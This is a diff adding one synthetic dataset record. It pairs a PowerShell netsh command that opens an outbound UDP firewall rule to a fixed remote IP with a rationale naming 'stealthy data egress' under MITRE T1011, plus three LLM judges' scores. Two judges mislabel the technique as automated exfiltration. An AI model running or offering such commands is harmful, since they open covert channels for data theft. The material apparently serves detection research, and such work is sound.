@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "netsh advfirewall firewall add rule name=\"exfil_out_udp_60445\" dir=out action=allow enable=yes protocol=UDP remoteport=60445 remoteip=198.51.100.42 profile=any",
+  "explanation": "Creates a targeted outbound UDP allow rule for a high, uncommon port used by the configured tunnel/proxy, enabling alternate-medium exfiltration with minimal exposure (T1011).",
+  "rationale_steps": [
+    "Allow only the UDP port used by the tunnel (e.g., Teredo or custom proxy).",
+    "Restrict the rule to a single remote IP to avoid broad network impact.",
+    "Enable stealthy data egress over non-standard UDP channels."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-9788b456-046c34a1",
+  "source_prompt_hash": "9788b456",
+  "timestamp_utc": "2025-09-30T08:11:11.119466Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid netsh advfirewall syntax with correct flags, balanced quoting, and acceptable values for an outbound UDP rule.",
+        "semantic_score": 3,
+        "semantic_justification": "It would create the intended outbound UDP allow rule but requires administrative privileges and does not implement automated exfiltration as described by T1011.",
+        "combined_score": 4.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T02:08:51.132367Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for the netsh advfirewall firewall add rule command, including properly formatted parameters and values.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 (Automated Exfiltration) by creating a firewall rule that would allow outbound UDP traffic on an uncommon high port (60445) to a specific IP address, which could facilitate automated data exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:08:53.948813Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid flags and syntax for `netsh advfirewall firewall add rule`, including correctly quoted parameters.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command correctly defines an outbound firewall rule using the appropriate tool and arguments to facilitate exfiltration, the stated 'Privilege: None' means it will operationally fail to execute and cannot achieve its claimed intent of creating the rule.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:09:06.318422Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
